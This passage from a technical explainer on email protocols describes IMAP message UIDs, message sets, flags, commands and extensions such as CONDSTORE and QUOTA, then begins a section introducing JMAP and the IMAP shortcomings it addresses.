    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3.1.1"><strong><abbr title="Unique Identifier for an IMAP message">UID</abbr></strong></a>:
<abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> are numbers which are assigned in ascending order to messages.
Unlike the position of a message, which can change within and across sessions,
its <abbr title="Unique Identifier for an IMAP message">UID</abbr> is meant to stay the same.
When a message is deleted, the <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> of subsequent messages don’t change.
As a consequence, <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> are not necessarily contiguous.
Mail clients use <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> to synchronize flags and deletions
of the messages they’ve already retrieved from the server.
<abbr title="Internet Message Access Protocol">IMAP</abbr> has a special <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.8"><code>UID</code> command</a>,
which allows the client to use <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.4"><code>SEARCH</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.5"><code>FETCH</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.6"><code>STORE</code></a>, and
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.7"><code>COPY</code></a> with <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> instead of positions.
For example, clients issue the command <code>TAG UID FETCH 1:{LastSeenUIDNEXT-1} FLAGS</code>
to discover changes to old messages according to the informational
<a href="https://datatracker.ietf.org/doc/html/rfc4549#section-4.3.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4549</a>.
In other words, clients find out which messages have been deleted while they were offline
by fetching the flags for all locally stored messages from the server every time they reconnect.
All messages whose <abbr title="Unique Identifier for an IMAP message">UID</abbr> is no longer in the response are then removed.
If the <code>UIDNEXT</code> value in the response to <code>EXAMINE</code> or <code>SELECT</code>
is bigger than the last time the client connected,
the client knows that new messages arrived in the meantime.
If the <code>UIDVALIDITY</code> value in the same response is bigger than the last time it connected,
the client has to invalidate its <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> and rebuild its database.
Due to the overhead this causes, servers should avoid invalidating <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr>.
However, since folders can be renamed and clients reference them by name,
the content of a folder can change completely.
By using the current timestamp as the <code>UIDVALIDITY</code> value
whenever a folder is created or renamed,
servers can force clients to refetch all messages in such a folder.</li>
  </ul>

</details>

<details>
  <summary id="message-sets">
Message sets
</summary>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.5"><code>FETCH</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.6"><code>STORE</code></a>, and
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.7"><code>COPY</code></a> operate on a
<a href="https://datatracker.ietf.org/doc/html/rfc3501#page-90">set of messages</a>.
You can specify a single number, such as <code>4</code>,
a range of numbers, such as <code>6:8</code>,
or a combination thereof, such as <code>4,6:8</code>.
When referencing messages <a href="#message-numbers">by their position</a>,
<code>6:8</code> is guaranteed to select three messages as long as there are at least eight messages in the folder.
When using the <a href="#message-numbers"><code>UID</code> command</a>,
<code>6:8</code> selects between zero and three messages,
depending on whether messages with <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> in this range have been deleted.
<code>*</code> represents the largest number in use.
When referencing messages by their position,
<code>*</code> corresponds to the number of messages in the folder.
If the folder is empty, you get an error when using <code>*</code>.
If you want to fetch the <a href="#message-flags">flags</a> of all messages,
you can use <code>F UID FETCH 1:* (FLAGS)</code>.
If you want to fetch <a href="https://datatracker.ietf.org/doc/html/rfc4549#section-4.6">all new messages</a>,
you can use <code>F UID FETCH {LastSeenUIDNEXT}:* (FLAGS BODY.PEEK[])</code>.
<code>{LastSeenUIDNEXT}</code> needs to be replaced with an actual number, of course.
(You have to replace the curly brackets with an actual value in all my examples
except when the curly brackets are used as the <a href="#data-formats">length prefix of a literal string</a>.)</p>

</details>

<details>
  <summary id="message-flags">
Message flags
</summary>

  <p><abbr title="Internet Message Access Protocol">IMAP</abbr> messages can be tagged with labels, which are called flags.
Most flags are persisted across sessions but some flags are applied only within a session.
Flags defined by <abbr title="Internet Engineering Task Force">IETF</abbr> standards start with a backslash.
<abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3501 defines the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3.2">following flags</a>:</p>
  <ul>
    <li><code>\Seen</code>: The message has been seen (i.e. read).</li>
    <li><code>\Answered</code>: The message has been answered.</li>
    <li><code>\Flagged</code>: The message is flagged for special attention.</li>
    <li><code>\Deleted</code>: The message is marked for deletion by
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.2"><code>CLOSE</code></a> or
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.3"><code>EXPUNGE</code></a>.</li>
    <li><code>\Draft</code>: The message is marked as a draft, i.e. it hasn’t been sent yet.</li>
    <li><code>\Recent</code>: The message has arrived in the folder recently.
This flag cannot be set or removed by the client.
If the client uses <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.1"><code>SELECT</code></a>
instead of <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.2"><code>EXAMINE</code></a>,
this flag is no longer set in later sessions.</li>
  </ul>

  <p>In the response to the <code>EXAMINE</code> or <code>SELECT</code> command,
the server includes the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-7.2.6"><code>FLAGS</code></a>
which are defined in the folder.
As part of the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-7.1"><code>PERMANENTFLAGS</code> response</a>,
the server indicates which of the flags the client can set and remove.
If the list includes <code>\*</code>, the client can create custom tags,
which may not start with a backslash.
The <a href="https://datatracker.ietf.org/doc/html/rfc3501#page-86">formal syntax</a> specifies the permissible characters.</p>

  <figure>
    
    <figcaption>
How a custom flag can be created and set if the <abbr title="Internet Message Access Protocol">IMAP</abbr> server supports it.
</figcaption>
  </figure>

</details>

<details>
  <summary id="internal-date">
Internal date
</summary>

  <p>Besides <a href="#message-flags">flags</a>,
messages have <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3">other attributes</a> as well.
One of them is the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3.3">internal date</a>,
which records when the message was received.
Mail clients can display messages with this date
instead of the sender-chosen <a href="#origination-date">origination date</a>.
Since Apple Mail also displays the received date instead of the sent date
when fetching messages via <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a>,
it seems to rely on the <a href="#trace-information"><code>Received</code> header field</a> indeed.
Other attributes which can be fetched
are the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3.4">message size</a>
and the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-2.3.6">body structure</a>
of <a href="#multipart-messages">multipart messages</a>.</p>

  <figure>
    
    <figcaption>
How to fetch when a message was received.
</figcaption>
  </figure>

</details>

<details>
  <summary id="imap-commands">
<abbr title="Internet Message Access Protocol">IMAP</abbr> commands
</summary>

  <p>Some of the commands used in the above tool benefit from additional information.
This is what you should know about them:</p>
  <ul>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.2"><code>EXAMINE</code></a> vs.
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.1"><code>SELECT</code></a>:
Both commands open a folder in order to search and fetch the messages in it.
The difference is that <code>EXAMINE</code> opens the folder in read-only mode,
while <code>SELECT</code> also allows the client to change and delete messages.
This is made visible in the response line which starts with the tag:
It contains either <code>[READ-ONLY]</code> or <code>[READ-WRITE]</code>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.4"><code>SEARCH</code></a>:
Saving a search result for later operations requires the <a href="#imap-extensions"><code>SEARCHRES</code> extension</a>.
If your <abbr title="Internet Message Access Protocol">IMAP</abbr> server doesn’t support it,
you have to search without the <code>RETURN (SAVE)</code> part: <code>S SEARCH {Criterion}</code>.
The server then returns the <a href="#message-numbers">positions</a>
of all the messages that match the criterion: <code>* SEARCH 2 5 8</code>.
Search criteria can also be combined: <code>S SEARCH {Criterion1} {Criterion2} {etc.}</code>.
<abbr title="Internet Message Access Protocol">IMAP</abbr> also supports the logical operators <a href="https://datatracker.ietf.org/doc/html/rfc3501#page-52"><code>NOT</code> and <code>OR</code></a>
besides the implicit “and”: <code>NOT {Criterion}</code> and <code>OR {Criterion1} {Criterion2}</code>.
As you can see, the <a href="https://en.wikipedia.org/wiki/Query_language">query language</a> of <abbr title="Internet Message Access Protocol">IMAP</abbr> is quite powerful.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.5"><code>FETCH</code></a>:
The first argument to the <code>FETCH</code> command is a <a href="#message-sets">set of messages</a>.
If the server supports saving the search result with <code>RETURN (SAVE)</code>,
you can alternatively reference the search result with the dollar sign.
The second argument is a list of the data attributes you want to fetch.
The difference between <code>BODY[{Section}]</code> and <code>BODY.PEEK[{Section}]</code> is that
the former sets the <a href="#message-flags"><code>\Seen</code> flag</a> while the latter does not.
You can use either one to fetch the <a href="https://datatracker.ietf.org/doc/html/rfc3501#page-55">desired section</a>
of the specified messages.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.6"><code>STORE</code></a>:
The <code>STORE</code> command allows the client to alter the <a href="#message-flags">flags of a message</a>.
Similar to <code>FETCH</code>, the first argument is either
a <a href="#message-sets">message set</a> or <code>$</code> for a <a href="#imap-extensions">search result</a>.
After that, you can replace the flags of the messages with <code>FLAGS ({NewFlags})</code>,
add additional flags to the existing flags with <code>+FLAGS ({FlagsToAdd})</code>,
or remove some flags from the existing flags with <code>-FLAGS ({FlagsToRemove})</code>.
Messages are deleted by flagging them as <code>\Deleted</code> and then using the
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.2"><code>CLOSE</code></a> or
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.3"><code>EXPUNGE</code></a> command.
The former also closes the folder and takes you back to the <a href="#protocol-states">authenticated state</a>,
whereas the latter doesn’t do that.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.11"><code>APPEND</code></a>:
Mail clients use this command to <a href="#double-submission-problem">store sent messages</a> in the user’s mailbox.
Since the target folder is specified in the first argument,
this command can be used from the <a href="#protocol-states">authenticated state</a>.
Besides the <a href="#message-flags">flags</a> you want to set on the appended message,
you can also specify the <a href="#internal-date">internal date</a> in an optional third argument.
The fourth argument is the message that you want to append,
which has to be transmitted as a <a href="#data-formats">length-prefixed string</a>.
Since counting bytes manually is a hassle,
the tool does the counting for you when you enable <code>Write</code> and <code>Append</code>.
You can edit the used message in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.</li>
  </ul>

</details>

<details>
  <summary id="imap-extensions">
<abbr title="Internet Message Access Protocol">IMAP</abbr> extensions
</summary>

  <p>Given the importance of <abbr title="Internet Message Access Protocol">IMAP</abbr> in the email ecosystem,
there are numerous extensions for it.
You can query which extensions a server supports
with the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.1.1"><code>CAPABILITY</code> command</a>.
You see an example when you enable the <code>Search</code> or the <code>Idle</code> option in the tool above.
Before using the enabled commands,
make sure that your server supports the listed extensions.
Issuing <code>C CAPABILITY</code> is often not necessary
since many <abbr title="Internet Message Access Protocol">IMAP</abbr> servers list their capabilities automatically
in their response to the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.2.3"><code>LOGIN</code> command</a>.</p>

  <p>The most important extensions to <abbr title="Internet Message Access Protocol">IMAP</abbr> are (ignoring the ones for
<a href="#email-address-internationalization">internationalization</a>,
such as <a href="https://datatracker.ietf.org/doc/html/rfc6855">support for <abbr title="Unicode Transformation Format">UTF</abbr>-8</a>):</p>
  <ul>
    <li><code>IMAP4REV1</code> (<a href="https://datatracker.ietf.org/doc/html/rfc3501"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3501</a>):
By listing this among its capabilities,
a server indicates that it supports <abbr title="Internet Message Access Protocol">IMAP</abbr> version 4 revision 1 as published in 2003.
<code>IMAP4rev1</code> is the protocol we’ve been discussing in this article.
A <a href="https://datatracker.ietf.org/doc/draft-ietf-extra-imap4rev2/?include_text=1">second revision</a>,
which adds most of the extensions mentioned here to the core protocol, is in the making.
The changes to the first revision are listed in
<a href="https://datatracker.ietf.org/doc/html/draft-ietf-extra-imap4rev2-30#appendix-E">its appendix</a>.</li>
    <li><code>STARTTLS</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2595#section-3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2595</a>):
This extension allows the client to upgrade the connection from <abbr title="Transmission Control Protocol">TCP</abbr> to <abbr title="Transport Layer Security">TLS</abbr> with <code>. STARTTLS</code>.
You have to use <code>telnet {ServerDomain} 143</code> to see this capability listed by the server.
(143 is <a href="#port-numbers"><abbr title="Internet Message Access Protocol">IMAP</abbr>’s port</a> for <a href="#use-of-tls">Explicit <abbr title="Transport Layer Security">TLS</abbr></a>.)</li>
    <li><code>SASL-IR</code> (<a href="https://datatracker.ietf.org/doc/html/rfc4959"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4959</a>):
If the server has this capability,
the client can append its initial <a href="#user-authentication"><abbr title="Simple Authentication and Security Layer">SASL</abbr></a> response
to the <a href="#protocol-states"><code>AUTHENTICATE</code> command</a>,
which saves one <a href="https://evalapply.org/internet/#network-performance">round trip</a>.
Example: <code>. AUTHENTICATE PLAIN {Base64EncodingOfUsernameAndPassword}</code>.</li>
    <li><code>ENABLE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc5161"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5161</a>):
While <code>CAPABILITY</code> allows the server to list the extensions it supports,
the <code>ENABLE</code> command allows the client to list the extensions it supports.
This allows the server to send unsolicited responses defined by these extensions.</li>
    <li><code>ID</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2971"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2971</a>):
For improving bug reports and assembling usage statistics,
it’s useful to know which implementation of the protocol the other party uses.
The <code>ID</code> command allows the client to send a list of key-value pairs to the server
and receive a list of key-value pairs in return.
Some keys are <a href="https://datatracker.ietf.org/doc/html/rfc2971#section-3.3">specified in the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a>
but any string of at most 30 bytes can be used as a key.
For example, a client can send <code>TAG ID (&#34;name&#34; &#34;ef1p&#34;)</code> to the server
and receive <code>* ID (&#34;name&#34; &#34;Dovecot&#34;)</code> in return.</li>
    <li><code>IDLE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2177"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2177</a>):
Instead of regularly polling the server for changes,
a client can instruct the server with the <code>IDLE</code> command
to transmit changes to the current folder in real time.
You can enable <code>Idle</code> in the <a href="#tool-protocol-imap">tool above</a> to see an example.
As long as the <abbr title="Transmission Control Protocol">TCP</abbr> connection between the client and the server remains open,
the client is notified about new messages immediately.
In order to avoid <a href="https://evalapply.org/internet/#connection-loss">timeouts due to inactivity</a>,
the client can send the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.1.2"><code>NOOP</code> command</a>,
which <a href="https://en.wikipedia.org/wiki/NOP_(code)#NOP_protocol_commands">does nothing</a>, from time to time.</li>
    <li><code>ESEARCH</code> (<a href="https://datatracker.ietf.org/doc/html/rfc4731"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4731</a>):
<code>ESEARCH</code> is an extension to the <code>SEARCH</code> and <code>UID SEARCH</code> commands,
which allows the client to choose between several <a href="https://datatracker.ietf.org/doc/html/rfc4731#section-3.1">result options</a>
by issuing <code>. SEARCH RETURN ({Options}) {Criteria}</code>.
The options are <code>MIN</code> to return the <a href="#message-numbers">position or <abbr title="Unique Identifier for an IMAP message">UID</abbr></a>
of the first message in the folder which satisfies the criteria,
<code>MAX</code> to return the position or <abbr title="Unique Identifier for an IMAP message">UID</abbr> of the last message in the folder which satisfies the criteria,
<code>COUNT</code> to return the number of messages in the folder which satisfy the criteria,
and <code>ALL</code> to return the numbers of all messages which satisfy the criteria.
When using the <code>ALL</code> option, the messages are returned in the <a href="#message-sets">set syntax</a>
instead of the space-separated enumeration of all messages.
For example, a client can query how many messages are flagged with <code>TAG SEARCH RETURN (COUNT) FLAGGED</code>.</li>
    <li><code>SEARCHRES</code> (<a href="https://datatracker.ietf.org/doc/html/rfc5182"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5182</a>):
<code>SEARCHRES</code> is an extension to the <code>ESEARCH</code> extension.
Any server which supports <code>SEARCHRES</code> also has to support <code>ESEARCH</code>.
<code>SEARCHRES</code> adds the result option <code>SAVE</code>,
which tells the server to save the search result for later use instead of returning it.
The client can reference the search result with <code>$</code> in the
<code>FETCH</code>, <code>STORE</code>, and some other commands.
One advantage of this is that the client doesn’t have to wait for the search result
before it can submit a subsequent command.</li>
    <li><code>UIDPLUS</code> (<a href="https://datatracker.ietf.org/doc/html/rfc4315"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4315</a>):
<code>UIDPLUS</code> adds the command <a href="https://datatracker.ietf.org/doc/html/rfc4315#section-2.1"><code>UID EXPUNGE</code></a>
and <a href="https://datatracker.ietf.org/doc/html/rfc4315#section-3">additional response codes</a>,
which inform the client about the <a href="#message-numbers"><abbr title="Unique Identifier for an IMAP message">UID</abbr></a> of an appended or copied message.
This is useful for clients to synchronize with servers more efficiently.</li>
    <li><code>CONDSTORE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc4551"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4551</a>):
<code>CONDSTORE</code> is by far the biggest extension in this list.
It introduces <code>MODSEQ</code> as an additional <a href="#internal-date">message attribute</a>
and <code>HIGHESTMODSEQ</code> as an additional response to the <code>EXAMINE</code> and <code>SELECT</code> commands.
<code>MODSEQ</code> works like <code>UID</code> but instead of assigning a permanent, strictly increasing number to each message,
it assigns a permanent, strictly increasing number to each message modification.
By remembering the <code>HIGHESTMODSEQ</code> value to which they synchronized,
clients can use the <a href="https://datatracker.ietf.org/doc/html/rfc4551#section-3.2">extended <code>STORE</code> or <code>UID STORE</code> commands</a>
to modify messages on the server only if no other client modified them in the meantime.
(<code>CONDSTORE</code> stands for conditional <code>STORE</code>.)
<code>CONDSTORE</code> also extends other commands.
For example, clients can use the <a href="https://datatracker.ietf.org/doc/html/rfc4551#section-3.3.1"><code>CHANGEDSINCE</code> modifier</a>
to fetch changes to messages more efficiently.
Instead of fetching <a href="#message-numbers">the flags of all messages</a> every time they connect,
clients can fetch the flags of just the messages which changed since the last time:
<code>TAG UID FETCH 1:* (FLAGS) (CHANGEDSINCE {LastSeenHIGHESTMODSEQ})</code>.
Unfortunately, clients can’t detect message deletions like this.</li>
    <li><code>QRESYNC</code> (<a href="https://datatracker.ietf.org/doc/html/rfc5162"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5162</a>):
<code>QRESYNC</code> extends <code>CONDSTORE</code> to allow for quick mailbox resynchronization but it’s rarely supported.
By remembering the <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> of expunged messages with the corresponding <code>MODSEQ</code> value,
servers can inform clients efficiently about deleted messages.
Both <code>CONDSTORE</code> and <code>QRESYNC</code> were updated in <a href="https://datatracker.ietf.org/doc/html/rfc7162"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7162</a>.
In the absence of <code>QRESYNC</code>,
clients can perform a <a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">“binary” search</a>
to find the first message whose <a href="#message-numbers">position</a> changed.
Clients need to do this only when the <code>EXISTS</code> count from the server is different from the local count
after adding all the newly arrived messages.
Clients can retrieve the <abbr title="Unique Identifiers for IMAP messages">UIDs</abbr> of several messages at once
by issuing <code>TAG UID SEARCH {Position1},{Position2},{etc.}</code>.</li>
    <li><code>CHILDREN</code> (<a href="https://datatracker.ietf.org/doc/html/rfc3348"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3348</a>):
This extension allows the server to indicate in its response to the
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.8"><code>LIST</code> command</a>
whether a folder <code>\HasChildren</code> or <code>\HasNoChildren</code>.
This allows the client to display a folder as expandable
without having to query for potential children with additional requests.</li>
    <li><code>SPECIAL-USE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc6154"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6154</a>):
Folders often have a specific purpose such as storing sent or deleted messages.
This extension allows clients to inform each other about the special use of a folder
without having to rely on specific names for the folders and
without having to ask the user where to store specific messages.
The <a href="https://datatracker.ietf.org/doc/html/rfc6154#section-2">defined purposes</a> are
<code>\All</code>, <code>\Archive</code>, <code>\Drafts</code>, <code>\Flagged</code>, <code>\Junk</code>, <code>\Sent</code>, and <code>\Trash</code>.
The purpose can be set when <a href="https://datatracker.ietf.org/doc/html/rfc6154#section-3">creating a new folder</a>
and is returned in the response to the <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.3.8"><code>LIST</code> command</a>.
Gmail supports this extension and its response is roughly what you see in the <a href="#tool-protocol-imap">tool above</a>.</li>
    <li><code>NAMESPACE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2342"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2342</a>):
This extension introduces a <a href="https://datatracker.ietf.org/doc/html/rfc2342#section-5"><code>NAMESPACE</code> command</a>,
which allows clients to discover the namespaces of personal folders and of shared folders.
My understanding is that this is mostly used in corporate settings.</li>
    <li><code>MOVE</code> (<a href="https://datatracker.ietf.org/doc/html/rfc6851"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6851</a>):
This extension defines the commands <a href="https://datatracker.ietf.org/doc/html/rfc6851#section-3.1"><code>MOVE</code></a>
and <a href="https://datatracker.ietf.org/doc/html/rfc6851#section-3.2"><code>UID MOVE</code></a> to move messages from one folder to another.
When <code>MOVE</code> is not supported, clients have to <a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.7"><code>COPY</code></a>
messages to another folder and then delete the copied messages in the old folder with
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.6"><code>STORE</code></a> and
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.4.3"><code>EXPUNGE</code></a>.
This is inefficient for both the client and the server
and can lead to <a href="https://datatracker.ietf.org/doc/html/rfc6851#section-1">undesirable side effects</a>.</li>
    <li><code>QUOTA</code> (<a href="https://datatracker.ietf.org/doc/html/rfc2087"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2087</a>):
This extension allows clients to get and set the storage quota of their mailbox.
For example, when using <code>Q GETQUOTA &#34;&#34;</code> in my Gmail test account,
I get <code>* QUOTA &#34;&#34; (STORAGE 145 15728640)</code>.
The first number is the current usage in <a href="https://en.wikipedia.org/wiki/Kibibyte">kibibytes</a>,
the second number the resource limit,
which matches the <a href="https://one.google.com/faq/storage">15 GB of free storage</a> as advertised by Google.
When using <code>Q SETQUOTA &#34;&#34; (STORAGE 1000)</code>, I get <code>Q NO [CANNOT] Permission denied. (Failure)</code>.
<code>&#34;&#34;</code> denotes the so-called quota root, which allows different folders to share the same resource limit.</li>
  </ul>

  <p>In addition to the extensions which are standardized by <abbr title="Internet Engineering Task Force">IETF</abbr>,
mailbox providers are free to define their own extensions.
According to the <abbr title="Internet Message Access Protocol">IMAP</abbr> standard, the name of an experimental or independent extension
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.5.1">has to start with an <code>X</code></a>.
For example, <a href="https://developers.google.com/gmail/imap/imap-extensions">Gmail’s custom extension</a>
is advertised as <code>X-GM-EXT-1</code> in the response to the
<a href="https://datatracker.ietf.org/doc/html/rfc3501#section-6.1.1"><code>CAPABILITY</code> command</a>.
Among other things, it allows clients to use
<a href="https://developers.google.com/gmail/imap/imap-extensions#extension_of_the_search_command_x-gm-raw">Gmail’s search syntax</a>
and <a href="https://developers.google.com/gmail/imap/imap-extensions#access_to_the_gmail_unique_message_id_x-gm-msgid">Gmail’s message ID</a>.</p>

</details>

<h4 id="json-meta-application-protocol"><abbr title="JavaScript Object Notation">JSON</abbr> Meta Application Protocol (<abbr title="JSON Meta Application Protocol">JMAP</abbr>)</h4>

<p>Over the last forty years, email in general and
<a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a> in particular
became a <a href="#imap-extensions">patchwork of extensions</a>.
Given the complexity and the varying support of these extensions,
writing a mail client is much more difficult than it should be.
While there are efforts to
<a href="https://datatracker.ietf.org/doc/draft-ietf-extra-imap4rev2/?include_text=1">unify the patchwork</a> somewhat,
there has also been a fresh start over the last couple of years.
An <a href="https://datatracker.ietf.org/wg/jmap/about/"><abbr title="Internet Engineering Task Force">IETF</abbr> working group</a>
designed a modern protocol for <a href="#standardization">client to server interaction</a>:
The <a href="https://en.wikipedia.org/wiki/JSON_Meta_Application_Protocol"><abbr title="JavaScript Object Notation">JSON</abbr> Meta Application Protocol (<abbr title="JSON Meta Application Protocol">JMAP</abbr>)</a>.
<abbr title="JavaScript Object Notation">JSON</abbr> itself stands for <a href="https://en.wikipedia.org/wiki/JSON">JavaScript Object Notation</a>,
which is a popular format for storing and exchanging human-readable data.
<abbr title="JSON Meta Application Protocol">JMAP</abbr> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc8620"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8620</a>
and it can be used for more than just email.
The data model for synchronizing email is specified in <a href="https://datatracker.ietf.org/doc/html/rfc8621"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8621</a>.
If you don’t like the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> formatting, you can also read the two standards
<a href="https://jmap.io/spec-core.html">here</a> and <a href="https://jmap.io/spec-mail.html">here</a>.</p>

<p><abbr title="JSON Meta Application Protocol">JMAP</abbr> is designed to be interoperable with <abbr title="Internet Message Access Protocol">IMAP</abbr> mailboxes
and thus shares the concepts of folders and flags with <abbr title="Internet Message Access Protocol">IMAP</abbr>.
The protocol itself, however, is completely new
and addresses the following shortcomings of <abbr title="Internet Message Access Protocol">IMAP</abbr> (and <a href="#submission-versus-relay">message submission</a>):</p>
<ul>
  <li><strong>Permanent identifiers</strong>:
<abbr title="JSON Meta Application Protocol">JMAP</abbr> servers assign permanent identifiers to all objects.
In the case of messages, these identifiers can no longer be <a href="#message-numbers">invalidated</a>
and they no longer change when a message is moved from one folder to another.
In the case of folders, <abbr title="JSON Meta Application Protocol">JMAP</abbr> clients can detect when a folder has been renamed
and no longer need to fetch all the messages in it again.</li>
  <li><strong>Efficient synchronization</strong>:
<abbr title="JSON Meta Application Protocol">JMAP</abbr> provides a <a href="https://jmap.io/spec-core.html#changes">simple method</a>
for getting the identifiers of created, updated, and destroyed messages and folders.
As we have seen <a href="#imap-extensions">above</a>, synchronizing a mailbox with <abbr title="Internet Message Access Protocol">IMAP</abbr> is easy only
if you stay connected to the server, which isn’t an option for mobile clients.</li>
  <li><strong>Push mechanism</strong>:
In order to be informed immediately about changes to a folder, such as newly arrived messages,
<abbr title="Internet Message Access Protocol">IMAP</abbr> clients use the <a href="https://datatracker.ietf.org/doc/html/rfc2177"><code>IDLE</code> command</a>.
If they want to be informed about changes to several folders,
they have to open a separate connection for each folder.
<abbr title="JSON Meta Application Protocol">JMAP</abbr>, on the other hand, allows clients
to <a href="https://jmap.io/spec-core.html#push">subscribe to all changes</a> on the server at once.
Clients which can keep a connection to the server open can subscribe via the
<a href="https://developer.mozilla.org/en-US/docs/Web/API/EventSource"><code>EventSource</code> interface</a>.
Other clients, such as those on mobile phones, can register a
<a href="https://jmap.io/spec-core.html#pushsubscription">callback <abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr></a>,
which allows them to use their platform-specific
<a href="https://en.wikipedia.org/wiki/Push_technology#Push_notification">push technology</a>.</li>
  <li><strong>Batching of chained commands</strong>:
When the <abbr title="Internet Message Access Protocol">IMAP</abbr> server doesn’t support certain extensions such as <a href="#imap-extensions"><code>SEARCHRES</code></a>,
<abbr title="Internet Message Access Protocol">IMAP</abbr> clients often need to wait for the response to one command
before they can construct the followup command.
<abbr title="JSON Meta Application Protocol">JMAP</abbr> allows clients <a href="https://jmap.io/spec-core.html#the-request-object">to batch several commands</a>
and <a href="https://jmap.io/spec-core.html#references-to-previous-method-results">to reference the results</a>
from earlier commands in the same request.
Doing so avoids <a href="https://evalapply.org/internet/#network-performance">round trips</a>
and makes updates more <a href="https://en.wikipedia.org/wiki/Atomicity_(database_systems)">atomic</a>
(i.e. it becomes less likely that only some of the issued commands are being executed).</li>
  <li><strong>Widespread data format</strong>:
<abbr title="JSON Meta Application Protocol">JMAP</abbr> data doesn’t have to be encoded as <abbr title="JavaScript Object Notation">JSON</abbr>.
Future standards can specify other data formats.
The same is true for the transport protocol:
While <abbr title="JSON Meta Application Protocol">JMAP</abbr> currently uses <a href="https://en.wikipedia.org/wiki/HTTPS"><abbr title="HyperText Transfer Protocol Secure">HTTPS</abbr></a> as its transport protocol,
